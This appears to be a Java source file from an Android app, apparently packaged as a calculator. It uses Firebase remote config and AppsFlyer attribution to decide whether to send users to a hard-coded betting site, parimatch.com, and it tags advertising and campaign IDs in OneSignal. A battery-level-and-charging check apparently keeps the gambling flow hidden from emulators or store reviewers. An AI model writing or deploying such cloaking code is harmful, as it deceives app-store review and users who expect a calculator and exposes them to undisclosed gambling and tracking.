package com.calc.mathter.utils;

import android.content.Context;
import android.util.Log;

import com.appsflyer.AppsFlyerLib;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;

public class FirebaseConfigInit{
    Context context;
    Map<String, Object> data;
    PointBuilder pb;
    DevMode dev;
    PlugIn plug;
    Save save;
    SaveStates st;
    Main main;

    AppsFlyerConnection apps;

    public FirebaseConfigInit(Context context, Map<String, Object> data){
        this.context = context;
        this.data = data;
        try {
            save = new Save(context);
        } catch (JSONException e) {
        }
        dev = new DevMode(context);
        plug = new PlugIn(context);
        main = new Main(context);
        st = new SaveStates(context);
        apps = new AppsFlyerConnection(context);

    }

    public void fire(){
        FirebaseRemoteConfig frm = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        frm.setConfigSettingsAsync(configSettings);
        frm.fetchAndActivate().addOnCompleteListener(task -> {
            try {
                String fireString = frm.getString("add");
                JSONObject params = new JSONObject(fireString);
                JSONObject jsonObject = new JSONObject(data);

                if(jsonObject.optString("af_status").equals("Non-organic")) {
                    String campaign = jsonObject.optString("campaign");

                    if (campaign.isEmpty() || campaign.equals("null")) {
                        campaign = jsonObject.optString("c");
                    }

                    String[] splitsCampaign = campaign.split("_");
                    try {
                        OneSignal.sendTag("g_id", st.getAdId());
                        OneSignal.sendTag("user_id", splitsCampaign[2]);
                    } catch (Exception e) {
                    }
                    pb = new PointBuilder(context, /*params.optString("my_1")*/ "https://parimatch.com", campaign, AppsFlyerLib.getInstance().getAppsFlyerUID(context.getApplicationContext()));
                    st.setGo(1);

                }else if(jsonObject.optString("af_status").equals("Organic")) {
                    if (/*st.getDeveloper() ||*/ ((st.getBattary() == 100 || st.getBattary() == 90) && st.getCharging())) { //todo
                        st.setGo(2);
                    } else {
                        OneSignal.sendTag("g_id", st.getAdId());
                        OneSignal.sendTag("user_id", null);
                        pb = new PointBuilder(context, /*params.optString("my_1")*/ "https://parimatch.com", "null", AppsFlyerLib.getInstance().getAppsFlyerUID(context.getApplicationContext()));
                        st.setGo(1);
                    }
                } else{
                        st.setGo(2);
                }
                save.setFirstRef(false);
                save.setFirstFlyer(false);
            } catch (Exception ex) {
            }
        });
    }
}
